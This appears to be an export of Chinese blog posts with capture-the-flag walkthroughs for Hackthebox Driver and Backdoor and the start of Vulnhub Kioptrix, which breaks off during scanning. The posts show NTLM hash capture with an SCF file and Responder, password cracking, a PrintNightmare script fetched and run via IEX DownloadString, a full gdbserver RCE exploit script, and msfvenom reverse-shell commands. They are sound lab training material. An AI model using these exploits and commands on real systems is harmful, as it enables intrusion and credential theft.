Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Driver","date":"2021-11-26T11:38:36.000Z","updated":"2023-06-13T03:43:07.000Z","comments":true,"path":"2021/11/26/Hackthebox/Easy/Hackthebox-Driver/","link":"","permalink":"http://www.lucifiel.com/2021/11/26/Hackthebox/Easy/Hackthebox-Driver/","excerpt":"","text":"Hackthebox - Driver靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.106 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 09:33 EDT Nmap scan report for 10.10.11.106 Host is up (0.28s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|specialized|phone Running (JUST GUESSING): Microsoft Windows 2008|Vista|7|8.1|Phone (90%), FreeBSD 6.X (85%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_vista::sp2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows cpe:/o:freebsd:freebsd:6.2 Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Embedded Standard 7 (88%), Microsoft Windows 7 (88%), Microsoft Windows Server 2008 (88%), Microsoft Windows 7 or Windows Server 2008 R2 (86%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (86%), Microsoft Windows 7 Professional or Windows 8 (86%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m52s, deviation: 0s, median: 6h59m52s | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-10-12T20:34:34 |_ start_date: 2021-10-12T11:55:48 TRACEROUTE (using port 135/tcp) HOP RTT ADDRESS 1 274.83 ms 10.10.14.1 2 274.88 ms 10.10.11.106 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.40 secon 访问80端口提示需要登录，随便测个0 day(admin/admin)吧 0 day真好用，直接就进来了 在Firmware Updates处有个上传点，说不定是突破口 尝试了一下上传，但似乎是失败了，还得找其他思路来突破 咱们把目光放在smb上，我找到了一篇文章，其中的通过NTLM捕获进行攻击我觉得挺不错的 https://www.hackingarticles.in/smb-penetration-testing-port-445/ https://sql--injection.blogspot.com/p/smb.html 漏洞利用首先创建一个shell.scf文件 [Shell] Command=2 IconFile=\\\\10.10.14.18\\share\\test.ico [Taskbar] Command=ToggleDesktop 然后使用responder监听咱们连接htb的那个网卡 responder -wrf --lm -v -I tun0 然后去之前找到的上传点上传我们的shell.scf文件 [SMB] NTLMv2 Client : 10.10.11.106 [SMB] NTLMv2 Username : DRIVER\\tony [SMB] NTLMv2 Hash : tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000 然后responder监听的网卡会捕获到账户和hash 我们拿去到hashcat里进行解析 指令：hashcat -m 5600 tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000 /usr/share/wordlists/rockyou.txt --force 结果：TONY::DRIVER:4621242103dad095:83bfcb019542f3819bc7e01483163418:0101000000000000758c41c3a6e2d701fdd24c3ff72cbc5100000000020000000000000000000000:liltony 账号：tony 密码：liltony 使用evil-winrm进行登录 安装evil-winrm：gem install evil-winrm ┌──(root💀kali)-[~/Desktop] └─# evil-winrm -i 10.10.11.106 -u tony -p liltony Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; whoami driver\\tony *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; ls *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; cd .. *Evil-WinRM* PS C:\\Users\\tony&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\tony\\Desktop&gt; ls Directory: C:\\Users\\tony\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 11/25/2021 6:07 PM 34 user.txt *Evil-WinRM* PS C:\\Users\\tony\\Desktop&gt; cat user.txt 459008f0f8600767fe59f9602714aa04 成功拿到user权限的flag 权限提升get-process 使用该命令获取靶机的进程，在进程中可以看到一条 379 22 5140 13908 ...12 1228 spoolsv 在进程中发现spoolsv在运行，突破口就在这了 使用漏洞CVE-2021-1675即可提权 https://github.com/calebstewart/CVE-2021-1675 在本地使用python3架设一个http服务器 ┌──(root💀kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 然后远程加载我们的脚本 IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.10.14.18/CVE-2021-1675.ps1&quot;) 使用脚本添加一个新用户 *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; Invoke-Nightmare -DriverName &quot;DRIVER&quot; -NewUser &quot;lucifiel&quot; -NewPassword &quot;lucifiel123&quot; [+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll [+] using pDriverPath = &quot;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll&quot; [+] added user lucifiel as local administrator [+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator DefaultAccount Guest lucifiel tony The command completed with one or more errors. *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; runas /user:lucifiel powershell.exe Enter the password for lucifiel: *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator lucifiel The command completed successfully. 确认权限组没问题 使用新创建的账户进行登录 ┌──(root💀kali)-[~/Desktop] └─# evil-winrm -i 10.10.11.106 -u lucifiel -p lucifiel123 Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\lucifiel\\Documents&gt; whoami driver\\lucifiel *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; ls Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 11/26/2021 4:54 AM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; cat root.txt 548e6653f57567449ffce29432eaa8c3 成功得到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Backdoor - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Backdoor","date":"2021-11-24T11:38:36.000Z","updated":"2023-06-13T03:40:20.000Z","comments":true,"path":"2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/","link":"","permalink":"http://www.lucifiel.com/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/","excerpt":"","text":"Hackthebox - Backdoor靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.125 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 20:41 EST Nmap scan report for 10.10.11.125 Host is up (0.39s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: WordPress 5.8.1 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Backdoor – Real-Life 1337/tcp open waste? No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=11/21%OT=22%CT=1%CU=33566%PV=Y%DS=2%DC=T%G=Y%TM=619AF5 OS:A4%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=FB%GCD=1%ISR=101%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3 OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 587/tcp) HOP RTT ADDRESS 1 492.34 ms loaclhost (10.10.14.1) 2 492.34 ms 10.10.11.125 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.37 seconds 从上可以看到该台靶机使用了WordPress 5.8.1 CMS作为服务搭建，咱们去wpscan一下，顺便搜索看看是否有漏洞 ┌──(root💀kali)-[~/Desktop] └─# wpscan --url 10.10.11.125 --enumerate vp,u,vt,tt _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.11.125/ [10.10.11.125] [+] Started: Sun Nov 21 20:55:16 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.11.125/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09). | Found By: Rss Generator (Passive Detection) | - http://10.10.11.125/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt; | - http://10.10.11.125/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/ | Latest Version: 2.8 (up to date) | Last Updated: 2021-07-22T00:00:00.000Z | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.8 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: &#39;Version: 2.8&#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:30 &lt;====================================================================================================================================&gt; (358 / 358) 100.00% Time: 00:00:30 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:04:14 &lt;==================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:04:14 [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:03 &lt;======================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:03 [i] User(s) Identified: [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Nov 21 21:00:23 2021 [+] Requests Done: 2976 [+] Cached Requests: 18 [+] Data Sent: 836.808 KB [+] Data Received: 721.12 KB [+] Memory used: 297.57 MB [+] Elapsed time: 00:05:07 这边扫描后并没有什么太多有用的信息，插件和主题都没扫描出来，但知道了管理员用户为admin ┌──(root💀kali)-[~/Desktop] └─# searchsploit WordPress 5.8.1 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities | php/webapps/39553.txt WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection | php/webapps/44943.txt WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection | php/webapps/48918.sh ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 搜索后也发现确实存在三个漏洞，但都是插件漏洞，暂时无法确定是否存在这些插件，咱们先去 看看网站内容 点击Home以后跳转到http://backdoor.htb/然后提示咱们无法访问，把backdoor.htb加入hosts里再访问 加入后简单看了一下似乎没有什么东西，咱们扫描一下路径看看吧 ┌──(root💀kali)-[~/Desktop] └─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 50 -u http://backdoor.htb/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://backdoor.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/11/21 21:15:59 Starting gobuster in directory enumeration mode =============================================================== http://backdoor.htb/wp-content (Status: 301) [Size: 317] [--&gt; http://backdoor.htb/wp-content/] http://backdoor.htb/wp-includes (Status: 301) [Size: 318] [--&gt; http://backdoor.htb/wp-includes/] http://backdoor.htb/wp-admin (Status: 301) [Size: 315] [--&gt; http://backdoor.htb/wp-admin/] http://backdoor.htb/server-status (Status: 403) [Size: 277] =============================================================== 2021/11/21 21:47:17 Finished =============================================================== 漏洞利用还是没什么东西，有点难搞啊，只能手动去访问了，首先先去content看看吧 访问content后是空白页面，然后接着根据经验进行手动访问（由于我使用的是流量在进行渗透，继续爆破工作量比较大，只能根据经验进行判断了） http://backdoor.htb/wp-content/plugins/在该路径下有内容了，并且是一个目录遍历漏洞 ebook-download应当是一个wordpress的插件，进去看一下 有内容的只有readme.txt 进去看一下 确认是一个插件，咱们去exploit-db搜索一下是否有漏洞 https://www.exploit-db.com/exploits/39575 还真让我们找到一个漏洞 http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php 这是一个任意文件下载的漏洞，下载一个配置文件看一下 确认漏洞存在且可被利用，拿着对数据库密码去尝试一下是否可以登录admin用户 好吧看来是我年轻了，是无法直接利用的，咱们还得想办法进入数据库 突然来了灵感，或许突破口在无法读取到任何信息的1337端口上呢？但是我们无法读取1337端口，怎么知道它是什么服务呢？ 有办法 使用Wordpress插件的LFI（本地文件包含）来进行端口读取，咱说干就干 像这样读取&#x2F;proc&#x2F;pid&#x2F;cmdline文件就可以了，其中pid是可变数字，根据测试数字范围应该在900-1000之间 所以我们像这样设置好就可以开始爆破了 有了，可以看到这里有一个gdbserver的服务，经过测试该服务是架设在1337端口上的，可以进行利用 同时还发现一个有趣的东西 瞧瞧，这还没getshell呢，已经把root的东西都搞到了，也是没谁了 https://www.exploit-db.com/exploits/50539 这里找到了一篇gdbserver rce的exploit，开干 首先将exploit保存到本地 Step 1# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE) # Date: 2021-11-21 # Exploit Author: Roberto Gesteira Miñarro (7Rocky) # Vendor Homepage: https://www.gnu.org/software/gdb/ # Software Link: https://www.gnu.org/software/gdb/download/ # Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2 # Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries) #!/usr/bin/env python3 import binascii import socket import struct import sys help = f&#39;&#39;&#39; Usage: python3 {sys.argv[0]} &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt; Example: - Victim&#39;s gdbserver -&gt; 10.10.10.200:1337 - Attacker&#39;s listener -&gt; 10.10.10.100:4444 1. Generate shellcode with msfvenom: $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin 2. Listen with Netcat: $ nc -nlvp 4444 3. Run the exploit: $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin &#39;&#39;&#39; def checksum(s: str) -&gt; str: res = sum(map(ord, s)) % 256 return f&#39;{res:2x}&#39; def ack(sock): sock.send(b&#39;+&#39;) def send(sock, s: str) -&gt; str: sock.send(f&#39;${s}#{checksum(s)}&#39;.encode()) res = sock.recv(1024) ack(sock) return res.decode() def exploit(sock, payload: str): send(sock, &#39;qSupported:multiprocess+;qRelocInsn+;qvCont+;&#39;) send(sock, &#39;!&#39;) try: res = send(sock, &#39;vCont;s&#39;) data = res.split(&#39;;&#39;)[2] arch, pc = data.split(&#39;:&#39;) except Exception: print(&#39;[!] ERROR: Unexpected response. Try again later&#39;) exit(1) if arch == &#39;10&#39;: print(&#39;[+] Found x64 arch&#39;) pc = binascii.unhexlify(pc[:pc.index(&#39;0*&#39;)]) pc += b&#39;\\0&#39; * (8 - len(pc)) addr = hex(struct.unpack(&#39;&lt;Q&#39;, pc)[0])[2:] addr = &#39;0&#39; * (16 - len(addr)) + addr elif arch == &#39;08&#39;: print(&#39;[+] Found x86 arch&#39;) pc = binascii.unhexlify(pc) pc += b&#39;\\0&#39; * (4 - len(pc)) addr = hex(struct.unpack(&#39;&lt;I&#39;, pc)[0])[2:] addr = &#39;0&#39; * (8 - len(addr)) + addr hex_length = hex(len(payload))[2:] print(&#39;[+] Sending payload&#39;) send(sock, f&#39;M{addr},{hex_length}:{payload}&#39;) send(sock, &#39;vCont;c&#39;) def main(): if len(sys.argv) &lt; 3: print(help) exit(1) ip, port = sys.argv[1].split(&#39;:&#39;) file = sys.argv[2] try: with open(file, &#39;rb&#39;) as f: payload = f.read().hex() except FileNotFoundError: print(f&#39;[!] ERROR: File {file} not found&#39;) exit(1) with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock: sock.connect((ip, int(port))) print(&#39;[+] Connected to target. Preparing exploit&#39;) exploit(sock, payload) print(&#39;[*] Pwned!! Check your listener&#39;) if __name__ == &#39;__main__&#39;: main() Step 2然后使用msfvenom生成一个木马 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 PrependFork=true -o rev.bin Step 3使用nc监听一个本地端口 nc -nvlp 4444 Step 4执行Exploit ┌──(root💀kali)-[~/Desktop] └─# python3 exploit.py 10.10.11.125:1337 rev.bin 1 ⨯ [+] Connected to target. Preparing exploit [+] Found x64 arch [+] Sending payload [*] Pwned!! Check your listener 然后成功弹回一个shell ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.23] from (UNKNOWN) [10.10.11.125] 50626 whoami&amp;&amp;id user uid=1000(user) gid=1000(user) groups=1000(user) 使用python3获取一个交互式shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; user@Backdoor:/home/user$ user@Backdoor:/home/user$ ls ls user.txt user@Backdoor:/home/user$ cat user.txt cat user.txt 10ba3c92228d369cea03eec58f58420c 成功拿到user权限的flag 权限提升还记得我们之前看到的screen吗？这就是提权的关键，提权只需要两句 export TERM=xterm screen -x root/root 然后即可进入root权限 root@Backdoor:~# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到root权限 root@Backdoor:~# ls ls root.txt root@Backdoor:~# cat root.txt cat root.txt 692be0661cb8d3c7cdf05379c93b9e8c 成功拿到root用户的flag权限","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Kioptrix Level 1 - Vulnhub","slug":"Vulnhub/Vulnhub -Kioptrix","date":"2021-11-13T00:36:20.000Z","updated":"2023-06-13T03:56:35.000Z","comments":true,"path":"2021/11/13/Vulnhub/Vulnhub -Kioptrix/","link":"","permalink":"http://www.lucifiel.com/2021/11/13/Vulnhub/Vulnhub%20-Kioptrix/","excerpt":"","text":"靶场信息This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. 这个Kioptrix VM Image是很容易的挑战。游戏的目的是通过任何可能的手段获得root权限（除了实际入侵VM服务器或玩家）。这些游戏的目的是学习漏洞评估和利用方面的基本工具和技术。成功完成这些挑战的方法有很多。 下载地址 https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ 信息搜集首先使用arp获取靶机的IP地址 ┌──(root💀kali)-[~/Desktop] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.1.102 00:0c:29:55:cb:15 VMware, Inc. 9 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded 确定靶机IP地址为192.168.1.102，使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST Nmap scan report for 192.168.1.102 Host is up (0.00042s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) | ssh-hostkey: | 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1) | 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA) |_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: Test Page for the Apache Web Server on Red Hat Linux 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 1024/tcp status |_ 100024 1 1024/udp status 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-09-26T09:32:06 |_Not valid after: 2010-09-26T09:32:06 |_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time. | sslv2: | SSLv2 supported | ciphers: | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 |_ SSL2_DES_64_CBC_WITH_MD5 1024/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:55:CB:15 (VMware) Device type: general purpose Running: Linux 2.4.X OS CPE: cpe:/o:linux:linux_kernel:2.4 OS details: Linux 2.4.9 - 2.4.18 (likely embedded) Network Distance: 1 hop Host script results: |_clock-skew: 1h01m54s |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE HOP RTT ADDRESS 1 0.42 ms 192.168.1.102 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.83 seconds 这东西稍微的有点多，一个个看 80端口好像也没啥可看的？扫个目录看看吧 ┌──(root💀kali)-[~/Desktop] └─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.1.102/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/11/12 07:52:42 Starting gobuster in directory enumeration mode =============================================================== http://192.168.1.102/.htaccess (Status: 403) [Size: 273] http://192.168.1.102/.htpasswd (Status: 403) [Size: 273] http://192.168.1.102/.hta (Status: 403) [Size: 268] http://192.168.1.102/.htaccess.php (Status: 403) [Size: 277] http://192.168.1.102/.htpasswd.php (Status: 403) [Size: 277] http://192.168.1.102/.hta.php (Status: 403) [Size: 272] http://192.168.1.102/~root (Status: 403) [Size: 269] http://192.168.1.102/~operator (Status: 403) [Size: 273] http://192.168.1.102/cgi-bin/ (Status: 403) [Size: 272] http://192.168.1.102/index.html (Status: 200) [Size: 2890] http://192.168.1.102/manual (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/] http://192.168.1.102/mrtg (Status: 301) [Size: 292] 